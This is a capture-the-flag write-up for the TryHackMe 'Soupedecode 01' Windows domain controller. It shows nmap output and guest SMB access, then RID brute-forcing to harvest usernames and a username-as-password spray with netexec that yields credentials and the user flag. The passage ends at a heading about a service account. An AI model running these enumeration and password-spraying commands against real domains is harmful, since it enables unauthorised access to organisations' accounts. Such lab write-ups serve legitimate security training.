---
description: Test your enumeration skills on this boot-to-root machine. - by josemlwdf
icon: windows
layout:
  width: default
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Soupedecode 01

***

Platform: [TryHackMe](https://tryhackme.com/room/soupedecode01)

Difficulty: Easy

Machine Type: Windows

***

### Initial enumeration

Nmap scan results:

```
┌──(ghost㉿kali)-[~/tryhackme/soupedecode]
└─$ sudo nmap -Pn -A -p- --min-rate 4000 10.201.30.86 -oN nmap.full
```

```
Nmap scan report for 10.201.17.189
Host is up (0.35s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-25 08:07:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-08-25T08:08:54+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2025-06-17T21:35:42
|_Not valid after:  2025-12-17T21:35:42
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-25T08:08:16+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49710/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-08-25T08:08:19
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

```

Looking at the open ports, it's clear we are dealing with some type of windows domain controller machine.

First of all add DNS domain name to our /etc/hosts file.

Domain Name - SOUPEDECODE.LOCAL

Computer Name - DC01.SOUPEDECODE.LOCAL

### Initial Access as guest

As SMB is open on the target machine, I tried various method to list SMB shares, but only login as a built-in guest user with an empty password worked via netexec.

```
┌──(ghost㉿kali)-[~/tryhackme/soupedecode]
└─$ nxc smb 10.201.74.77 -u 'guest' -p '' --shares
```

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Results revealed IPC$ share is readable with these credentials, so I tried to connect to it via smbclient, but there was nothing present on that share.

```
┌──(ghost㉿kali)-[~/tryhackme/soupedecode]
└─$ smbclient '//10.201.74.77/IPC$' -U 'guest'
```

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Next I tried to brute force user's rid via netexec.

```
┌──(ghost㉿kali)-[~/tryhackme/soupedecode]
└─$ nxc smb 10.201.74.77 -u 'guest' -p '' --rid-brute > users-messed-list.txt 
```

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

As we got too many users from rid brute-force, now we can simply extract only username from this messed up list for further enumeration.

```
┌──(ghost㉿kali)-[~/tryhackme/soupedecode]
└─$ cut -d'\' -f2 users-messed-list.txt | cut -d' ' -f1 > formatted-users-list.txt
```

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

***

### Access as ybob317 and User flag

I began by enumerating SMB shares on the target domain using the `nxc smb` tool with a list of usernames (reused as passwords). Instead of brute-forcing, we only tested exact username-password pairs and continued the enumeration even after discovering valid credentials. During this process, I identified valid credentials for **ybob317**.

```
┌──(ghost㉿kali)-[~/tryhackme/soupedecode]
└─$ nxc smb 10.201.94.156 -u formatted-users-list.txt -p formatted-users-list.txt --no-brute --continue-on-success
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Then, I tried to enumerate shares with those valid credentials and found that user 'ybob317' had read access to 'Users' share.

```
┌──(ghost㉿kali)-[~/tryhackme/soupedecode]
└─$ nxc smb 10.201.57.152 -u 'ybob317' -p 'REDACTED' --shares
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Connected to 'Users' share via smbclient.

```
┌──(ghost㉿kali)-[~/tryhackme/soupedecode]
└─$ smbclient '//10.201.57.152/Users' -U 'ybob317'
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

All the directories were inaccessible except 'ybob317' and there I got the Desktop directory and then in Desktop I got user flag.

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Downloaded it on my own kali machine and got the user flag.

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

***

### Access as service account 'file\_svc'

